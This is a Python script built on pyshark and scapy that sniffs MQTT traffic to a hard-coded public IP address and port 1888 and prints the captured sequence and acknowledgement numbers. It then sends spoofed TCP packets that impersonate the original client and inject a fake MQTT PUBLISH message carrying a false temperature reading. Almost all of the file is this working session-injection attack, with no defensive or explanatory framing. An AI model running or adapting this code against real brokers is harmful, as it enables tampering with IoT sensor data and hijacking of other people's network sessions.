import pyshark
from scapy.all import *

# ========== Configuration ==========
interface = "ens33"
dst_ip_filter = "44.202.154.174"
dst_port_filter = "1888"
timeout = 5  # Capture timeout in seconds

# ========== Function Definitions ==========
def is_mqtt_raw(payload_bytes):
    try:
        first_byte = payload_bytes[0]
        msg_type = (first_byte >> 4) & 0x0F
        mqtt_type_map = {
            1: 'CONNECT',
            2: 'CONNACK',
            3: 'PUBLISH',
            4: 'PUBACK',
            8: 'SUBSCRIBE',
            9: 'SUBACK',
            12: 'PINGREQ',
            13: 'PINGRESP',
            14: 'DISCONNECT'
        }
        return mqtt_type_map.get(msg_type, None)
    except Exception as e:
        return None
    
# Fake MQTT PUBLISH payload (you can customize the topic/payload here)
mqtt_payload = (
    b"\x30\x1c\x00\x04"      # MQTT header: PUBLISH + topic length
    b"wsdz"                  # topic = "wsdz"
    b"\x00{"                 # payload starts with byte 0x00 + {
    b'\n  "temp": "5"\n}'    # JSON body
)

# ========== Start Capturing ==========
display_filter = f"ip.dst == {dst_ip_filter} && tcp.dstport == {dst_port_filter}"  # targeting PUBLISH packets

print(f"[*] Capturing on interface: {interface}")
print(f"[*] Display filter: {display_filter}")
print("[*] Waiting for MQTT PUBLISH packet...")

capture = pyshark.LiveCapture(interface=interface, display_filter=display_filter, 
                              override_prefs={ 
        "tcp.relative_sequence_numbers": "false"}
)

try:
    capture.sniff(packet_count=3, timeout=timeout)
except Exception as e:
    print("[!] Error during capture:", e)
    exit(1)

print(f"[*] Sniffing done. {len(capture)} packet(s) captured.")
capture.close()

for pkt in capture:
    try:
        if hasattr(pkt, "tcp") and hasattr(pkt.tcp, "payload"):
            raw_hex = pkt.tcp.payload.replace(":", "")  # e.g. '301c00047773647a007b0a2020202274656d70...'
            raw_bytes = bytes.fromhex(raw_hex)

            mqtt_type = is_mqtt_raw(raw_bytes)
            if mqtt_type:
                print(f"[+] Detected MQTT {mqtt_type} packet")
            else:
                print("[ ] Not MQTT")
    except Exception as e:
        print(f"[!] Error processing packet: {e}")


# ========== Display All Captured MQTT PUBLISH Packets ==========
print("\n[*] Listing all captured MQTT PUBLISH packets:\n")
for i, pkt in enumerate(capture):
    print(f"=== Packet {i+1} ===")

    try:
        # Basic info
        print(f"Time: {pkt.sniff_time}")
        print(f"From {pkt.ip.src}:{pkt.tcp.srcport} → {pkt.ip.dst}:{pkt.tcp.dstport}")
        print(f"TCP SEQ: {pkt.tcp.seq}  ACK: {pkt.tcp.ack}")
        print(f"IP ID     : {pkt.ip.id}")

        # MQTT layer info (if available)
        if hasattr(pkt, "mqtt"):
            mqtt_layer = pkt.mqtt
            print(f"Topic     : {mqtt_layer.topic if hasattr(mqtt_layer, 'topic') else '[no topic]'}")
            print(f"Payload   : {mqtt_layer.msg if hasattr(mqtt_layer, 'msg') else '[no payload]'}")
            print(f"QoS       : {mqtt_layer.qos}")
            print(f"Message Type: {mqtt_layer.msgtype}")

        # Raw payload (hex)
        raw_payload = bytes.fromhex(pkt.tcp.payload.replace(":", "")) if hasattr(pkt.tcp, "payload") else b""
        print(f"Raw Payload (hex): {raw_payload.hex()}")

        # Raw payload (ascii)
        try:
            print(f"Raw Payload (ascii): {raw_payload.decode(errors='ignore')}")
        except:
            print("Raw Payload (ascii): [decode error]")

    except Exception as e:
        print(f"[!] Error processing packet {i+1}: {e}")

    print("\n")


# ========== Analyze and Inject ==========
for pkt in capture:
    print("[*] Processing packet...")

    # IP and ports
    src_ip = pkt.ip.src
    dst_ip = pkt.ip.dst
    src_port = int(pkt.tcp.srcport)
    dst_port = int(pkt.tcp.dstport)

    # Extract original SEQ / ACK (non-relative)
    tcp_seq = int(pkt.tcp.seq)
    tcp_ack = int(pkt.tcp.ack)
    
    # Roughly calculate payload length (IP total len - IP header - TCP header)
    ip_total_len = int(pkt.length)
    ip_hdr_len = int(pkt.ip.hdr_len)
    tcp_hdr_len = int(pkt.tcp.hdr_len)
    mqtt_payload_len = 31

    print(f"    src: {src_ip}:{src_port} → dst: {dst_ip}:{dst_port}")
    print(f"    TCP SEQ: {tcp_seq}  ACK: {tcp_ack}  Payload Len: {mqtt_payload_len}")

    # Construct spoofed TCP + MQTT packet
    ip_layer = IP(src=src_ip, dst=dst_ip, flags="DF", id=int(pkt.ip.id, 16) + 1)
    tcp_layer = TCP(
        sport=src_port,
        dport=dst_port,
        seq=tcp_seq + mqtt_payload_len,
        ack=tcp_ack + 1,
        flags="PA"
    )
    packet = ip_layer / tcp_layer / Raw(load=mqtt_payload)

    print("[*] Sending spoofed MQTT PUBLISH...")
    send(packet, verbose=1)
    print("[+] Spoofed packet sent.\n")